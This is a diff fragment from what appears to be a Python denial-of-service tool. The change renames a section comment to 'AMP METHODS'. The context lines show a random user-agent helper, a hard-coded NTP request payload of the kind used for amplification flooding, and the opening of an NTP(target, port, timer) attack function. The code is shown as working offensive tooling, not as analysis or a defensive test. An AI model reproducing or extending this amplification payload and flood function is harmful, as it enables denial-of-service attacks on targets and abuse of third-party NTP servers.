@@ -33,7 +33,7 @@ def rand_ua():
         random.random() + random.randint(3, 9)
     )
 
-# NEW METHODS ----------------->
+# AMP METHODS ----------------->
 ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
 def NTP(target, port, timer):
     try:
